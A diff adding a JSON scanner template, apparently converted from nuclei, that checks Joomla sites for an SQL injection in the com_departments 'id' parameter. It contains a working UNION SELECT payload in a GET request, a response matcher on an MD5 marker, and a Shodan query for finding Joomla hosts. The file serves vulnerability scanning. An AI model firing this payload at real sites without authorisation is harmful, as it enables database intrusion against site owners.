@@ -1,0 +1,127 @@
+{
+  "id": "joomla-department-sqli",
+  "name": "Joomla `departments` - SQL Injection",
+  "author": "ritikchaddha",
+  "severity": "HIGH",
+  "description": "Joomla! `com_departments` parameter contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.\n",
+  "references": [
+    "https://github.com/opensec-cn/kunpeng/blob/master/plugin/json/joomla_departments_sqli.json",
+    "https://github.com/w3bd0gs/cocoworker/blob/master/plugins/beebeeto/poc_2014_0170.py"
+  ],
+  "tags": [
+    "joomla",
+    "sqli"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "shodan": "http.component:\"Joomla\""
+  },
+  "variables": {
+    "num": [
+      "999999999"
+    ]
+  },
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/index.php?option\u003dcom_departments\u0026id\u003d-1%20UNION%20SELECT%201,md5({{num}}),3,4,5,6,7,8--",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "{{md5(num)}}"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "joomla-department-sqli",
+    "info": {
+      "name": "Joomla `departments` - SQL Injection",
+      "author": "ritikchaddha",
+      "severity": "high",
+      "description": "Joomla! `com_departments` parameter contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.\n",
+      "reference": [
+        "https://github.com/opensec-cn/kunpeng/blob/master/plugin/json/joomla_departments_sqli.json",
+        "https://github.com/w3bd0gs/cocoworker/blob/master/plugins/beebeeto/poc_2014_0170.py"
+      ],
+      "metadata": {
+        "max_request": 1,
+        "shodan_query": "http.component:\"Joomla\""
+      },
+      "tags": "joomla,sqli"
+    },
+    "variables": {
+      "num": "999999999"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/index.php?option\u003dcom_departments\u0026id\u003d-1%20UNION%20SELECT%201,md5({{num}}),3,4,5,6,7,8--"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "{{md5(num)}}"
+            ],
+            "case_insensitive": false
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
